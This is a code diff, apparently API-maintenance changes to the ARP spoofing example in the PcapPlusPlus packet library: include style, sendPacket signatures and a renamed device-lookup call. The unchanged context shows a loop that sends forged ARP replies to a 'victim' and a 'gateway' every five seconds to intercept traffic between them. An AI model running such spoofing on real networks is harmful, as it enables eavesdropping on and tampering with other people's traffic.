@@ -1,13 +1,14 @@
 #include <iostream>
 #include <fstream>
-#include <MacAddress.h>
-#include <IpAddress.h>
-#include <PcapPlusPlusVersion.h>
-#include <SystemUtils.h>
-#include <PcapLiveDeviceList.h>
-#include <PcapLiveDevice.h>
-#include <EthLayer.h>
-#include <ArpLayer.h>
+#include "MacAddress.h"
+#include "IpAddress.h"
+#include "PcapPlusPlusVersion.h"
+#include "SystemUtils.h"
+#include "PcapLiveDeviceList.h"
+#include "PcapLiveDevice.h"
+#include "Packet.h"
+#include "EthLayer.h"
+#include "ArpLayer.h"
 #include <getopt.h>
 
 #define EXIT_WITH_ERROR(reason)                                                                                        \
@@ -81,7 +82,7 @@ pcpp::MacAddress getMacAddress(const pcpp::IPv4Address& ipAddr, pcpp::PcapLiveDe
 	}
 
 	// send the arp request and wait for arp reply
-	pDevice->sendPacket(&arpRequest);
+	pDevice->sendPacket(arpRequest);
 	pcpp::RawPacketVector capturedPackets;
 	pDevice->startCapture(capturedPackets);
 	std::this_thread::sleep_for(std::chrono::seconds(2));
@@ -153,10 +154,10 @@ void doArpSpoofing(pcpp::PcapLiveDevice* pDevice, const pcpp::IPv4Address& gatew
 	std::cout << "Sending ARP replies to victim and to gateway every 5 seconds..." << std::endl << std::endl;
 	while (1)
 	{
-		pDevice->sendPacket(&gwArpReply);
+		pDevice->sendPacket(gwArpReply);
 		std::cout << "Sent ARP reply: " << gatewayAddr << " [gateway] is at MAC address " << deviceMacAddress << " [me]"
 		          << std::endl;
-		pDevice->sendPacket(&victimArpReply);
+		pDevice->sendPacket(victimArpReply);
 		std::cout << "Sent ARP reply: " << victimAddr << " [victim] is at MAC address " << deviceMacAddress << " [me]"
 		          << std::endl;
 		std::this_thread::sleep_for(std::chrono::seconds(5));
@@ -236,7 +237,7 @@ int main(int argc, char* argv[])
 		EXIT_WITH_ERROR("Gateway address is not valid");
 	}
 
-	pcpp::PcapLiveDevice* pIfaceDevice = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIp(ifaceAddr);
+	pcpp::PcapLiveDevice* pIfaceDevice = pcpp::PcapLiveDeviceList::getInstance().getDeviceByIp(ifaceAddr);
 
 	// Verifying interface is valid
 	if (pIfaceDevice == nullptr)
